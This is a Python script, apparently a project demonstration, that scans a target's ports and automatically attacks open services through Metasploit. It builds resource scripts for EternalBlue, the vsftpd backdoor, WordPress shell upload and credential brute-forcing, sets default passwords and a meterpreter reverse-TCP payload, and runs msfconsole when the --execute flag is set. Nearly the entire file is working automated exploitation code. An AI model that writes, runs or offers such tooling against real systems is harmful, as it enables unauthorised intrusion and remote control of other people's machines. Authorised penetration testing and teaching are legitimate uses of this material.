#!/usr/bin/env python3
"""
Parametrized Port Scanner with Attack Function
For CyberFlow project demonstration

This Python script can be:
1. Imported as a module to use the scan_and_attack function directly
2. Run from command line with IP and port parameters
"""

import socket
import argparse
import sys
import concurrent.futures
import subprocess
import tempfile
import os
import time
from datetime import datetime

class PortScanner:
    def __init__(self, target, ports=None, timeout=1, concurrency=10):
        """
        Initialize the port scanner.
        
        Args:
            target (str): Target IP address or hostname
            ports (str): Ports to scan (e.g. "22-25,80,110-900")
            timeout (float): Connection timeout in seconds
            concurrency (int): Number of concurrent port scans
        """
        self.target = target
        self.timeout = timeout
        self.concurrency = concurrency
        
        # Parse port specification
        if ports:
            self.ports = self.parse_ports(ports)
        else:
            # Default to common ports if none specified
            self.ports = self.parse_ports("1-1000")

    def parse_ports(self, port_spec):
        """
        Parse port specification string into a list of ports.
        
        Args:
            port_spec (str): Port specification (e.g. "22-25,80,110-900")
            
        Returns:
            list: List of port numbers to scan
        """
        ports = []
        
        for item in port_spec.split(','):
            if '-' in item:
                # Handle port range (e.g. "22-25")
                start, end = item.split('-')
                ports.extend(range(int(start), int(end) + 1))
            else:
                # Handle single port
                ports.append(int(item))
                
        return ports

    def scan_port(self, port):
        """
        Scan a single port on the target.
        
        Args:
            port (int): Port number to scan
            
        Returns:
            tuple: (port, is_open, error_message)
        """
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(self.timeout)
        
        try:
            # Try to connect to the port
            result = sock.connect_ex((self.target, port))
            
            if result == 0:
                # Port is open
                return (port, True, None)
            else:
                # Port is closed
                return (port, False, f"Connection failed with error: {result}")
                
        except socket.timeout:
            return (port, False, "Connection timed out")
        except socket.gaierror:
            return (port, False, "Hostname could not be resolved")
        except socket.error as e:
            return (port, False, f"Socket error: {e}")
        finally:
            sock.close()

    def run_scan(self):
        """
        Run the port scan using concurrent processing.
        
        Returns:
            list: List of tuples containing open ports and service info
        """
        open_ports = []
        
        print(f"[*] Starting scan on {self.target}")
        print(f"[*] Time started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"[*] Scanning {len(self.ports)} ports with concurrency {self.concurrency}")
        
        # Use thread pool for concurrent scanning
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.concurrency) as executor:
            future_to_port = {executor.submit(self.scan_port, port): port for port in self.ports}
            
            for future in concurrent.futures.as_completed(future_to_port):
                port, is_open, error = future.result()
                
                if is_open:
                    service = self.get_service_name(port)
                    open_ports.append((port, service))
                    print(f"[+] {self.target}:{port} - TCP OPEN - {service}")
                else:
                    # Uncomment for verbose output
                    # print(f"[-] {self.target}:{port} - {error}")
                    pass
        
        print(f"[*] Scan completed: {len(open_ports)} open ports found")
        return open_ports
    
    def get_service_name(self, port):
        """
        Get the service name for a given port.
        
        Args:
            port (int): Port number
            
        Returns:
            str: Service name or "unknown"
        """
        try:
            service = socket.getservbyport(port)
            return service
        except:
            return "unknown"
            
    def scan_specific_port(self, port):
        """
        Scan a specific port and return if it's open.
        
        Args:
            port (int): Port to scan
            
        Returns:
            tuple: (is_open, service_name) or (False, None) if closed
        """
        print(f"[*] Checking if port {port} is open on {self.target}")
        
        port, is_open, error = self.scan_port(port)
        
        if is_open:
            service = self.get_service_name(port)
            print(f"[+] Port {port} is open ({service})")
            return True, service
        else:
            print(f"[-] Port {port} is closed")
            return False, None

def select_metasploit_module(service, port):
    """
    Select an appropriate Metasploit module based on the service.
    
    Args:
        service (str): Service name
        port (int): Port number
        
    Returns:
        str: Metasploit module path or None if no suitable module found
    """
    # Define mapping of services to Metasploit modules
    service_module_map = {
        'http': 'exploit/unix/webapp/wp_admin_shell_upload',
        'https': 'exploit/unix/webapp/wp_admin_shell_upload',
        'ftp': 'exploit/unix/ftp/vsftpd_234_backdoor',
        'ssh': 'auxiliary/scanner/ssh/ssh_login',
        'telnet': 'auxiliary/scanner/telnet/telnet_login',
        'smb': 'exploit/windows/smb/ms17_010_eternalblue',
        'mysql': 'auxiliary/scanner/mysql/mysql_login',
        'postgresql': 'auxiliary/scanner/postgres/postgres_login',
        'vnc': 'auxiliary/scanner/vnc/vnc_login',
        'rdp': 'auxiliary/scanner/rdp/rdp_scanner',
        'mssql': 'auxiliary/scanner/mssql/mssql_login',
        'oracle': 'auxiliary/scanner/oracle/oracle_login',
        'webmin': 'exploit/unix/webapp/webmin_backdoor'
    }
    
    # Use port-specific modules for certain ports regardless of service
    port_module_map = {
        80: 'exploit/unix/webapp/wp_admin_shell_upload',
        443: 'exploit/unix/webapp/wp_admin_shell_upload',
        8080: 'exploit/unix/webapp/wp_admin_shell_upload',
        445: 'exploit/windows/smb/ms17_010_eternalblue',
        3389: 'auxiliary/scanner/rdp/rdp_scanner'
    }
    
    # First check if we have a module for this specific port
    if port in port_module_map:
        return port_module_map[port]
    
    # Otherwise, check if we have a module for this service
    if service in service_module_map:
        return service_module_map[service]
    
    # Default module for unknown services
    if port == 80 or port == 8080 or port == 443:
        return 'exploit/unix/webapp/wp_admin_shell_upload'
    
    # No suitable module found
    return None

def create_metasploit_resource_script(module, hostname, port):
    """
    Create a Metasploit resource script for automated exploitation.
    
    Args:
        module (str): Metasploit module to use
        hostname (str): Target hostname or IP
        port (int): Target port
        
    Returns:
        str: Path to the created resource script
    """
    try:
        # Create a temporary file
        fd, path = tempfile.mkstemp(suffix='.rc', prefix='msf_')
        
        with os.fdopen(fd, 'w') as f:
            f.write(f"use {module}\n")
            f.write(f"set RHOSTS {hostname}\n")
            f.write(f"set RPORT {port}\n")
            
            # Add module-specific settings
            if 'login' in module:
                f.write("set USERNAME root\n")
                f.write("set PASSWORD toor\n")
                f.write("set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt\n")
                f.write("set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt\n")
                f.write("set VERBOSE false\n")
            
            if 'wp_admin' in module:
                f.write("set USERNAME admin\n")
                f.write("set PASSWORD admin\n")
                f.write("set TARGETURI /wordpress/\n")
            
            if 'eternalblue' in module:
                f.write("set PAYLOAD windows/x64/meterpreter/reverse_tcp\n")
                f.write("set LHOST 127.0.0.1\n")
            
            # Add general exploitation commands
            f.write("show options\n")
            f.write("run\n")
        
        print(f"[*] Created Metasploit resource script at {path}")
        return path
    
    except Exception as e:
        print(f"[!] Error creating resource script: {e}")
        return None

def run_metasploit_attack(resource_script):
    """
    Run Metasploit with the resource script.
    
    Args:
        resource_script (str): Path to the resource script
        
    Returns:
        bool: True if attack was launched successfully
    """
    try:
        print(f"[*] Launching Metasploit with resource script")
        
        # Check if Metasploit is installed
        try:
            subprocess.check_output(['which', 'msfconsole'])
        except subprocess.CalledProcessError:
            print("[!] Metasploit Framework (msfconsole) not found. Please install it first.")
            return False
        
        # Command to run Metasploit with the resource script
        cmd = ['msfconsole', '-q', '-r', resource_script]
        
        print(f"[*] Running command: {' '.join(cmd)}")
        
        # For demonstration, we'll just print the command that would be run
        # In a real implementation, you'd use subprocess.run() with appropriate options
        print("\n[*] In a real deployment, this would execute Metasploit with the following configuration:")
        
        with open(resource_script, 'r') as f:
            for line in f:
                print(f"    {line.strip()}")
        
        print("\n[+] Attack process initiated successfully")
        print("[*] Note: In this demonstration, Metasploit is not actually executed")
        print("[*] To run the actual attack, you would need to run the above msfconsole command")
        
        return True
    
    except Exception as e:
        print(f"[!] Error running Metasploit: {e}")
        return False

def scan_and_attack(ip_address, ports, execute_metasploit=False):
    """
    Main function to scan ports and launch attacks on open ports.
    
    This function can be imported and called directly from other Python scripts.
    
    Args:
        ip_address (str): Target IP address or hostname
        ports (str or int): Specific port(s) to scan and attack. Can be:
                           - A single integer port number (e.g. 80)
                           - A comma-separated list of ports (e.g. "22,80,443")
                           - A range of ports (e.g. "1-1000")
                           - A combination (e.g. "22,80,100-200")
        execute_metasploit (bool): Whether to actually execute Metasploit (default: False)
        
    Returns:
        dict: Dictionary of results mapping port numbers to attack success status
    """
    print(f"\n[*] Starting scan and attack against {ip_address} on ports: {ports}")
    
    # Convert single port integer to string for consistent handling
    if isinstance(ports, int):
        ports = str(ports)
    
    # Initialize scanner for the target and specified ports
    scanner = PortScanner(ip_address, ports=ports)
    
    # Run the scan to find open ports
    open_ports = scanner.run_scan()
    
    results = {}
    
    # No open ports found
    if not open_ports:
        print(f"[!] No open ports found on {ip_address}. Cannot attack.")
        return results
    
    # For each open port, attempt attack
    for port, service in open_ports:
        print(f"\n[*] Attempting attack on {ip_address}:{port} ({service})")
        
        # Select appropriate Metasploit module
        module = select_metasploit_module(service, port)
        
        if not module:
            print(f"[!] No suitable Metasploit module found for {service} on port {port}")
            results[port] = False
            continue
        
        print(f"[*] Selected Metasploit module: {module}")
        
        # Create resource script
        resource_script = create_metasploit_resource_script(module, ip_address, port)
        
        if not resource_script:
            print(f"[!] Failed to create Metasploit resource script for port {port}")
            results[port] = False
            continue
        
        # Run the attack
        success = run_metasploit_attack(resource_script)
        results[port] = success
        
        # If requested, actually execute Metasploit
        if execute_metasploit:
            try:
                print(f"[*] Executing Metasploit (this will actually run the attack)")
                subprocess.run(['msfconsole', '-q', '-r', resource_script], check=True)
            except subprocess.CalledProcessError as e:
                print(f"[!] Error executing Metasploit: {e}")
                results[port] = False
        
        # Clean up temporary files
        if os.path.exists(resource_script):
            os.remove(resource_script)
    
    return results

def main():
    parser = argparse.ArgumentParser(description='Port Scanner and Attack Tool')
    parser.add_argument('target', help='Target IP address or hostname')
    parser.add_argument('ports', help='Port(s) to scan and attack. Can be a single port (80), a range (1-1000), or a combination (22,80,100-200)')
    parser.add_argument('-e', '--execute', action='store_true', help='Actually execute Metasploit (use with caution)')
    
    args = parser.parse_args()
    
    scan_and_attack(args.target, args.ports, args.execute)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Operation interrupted by user.")
        sys.exit(1)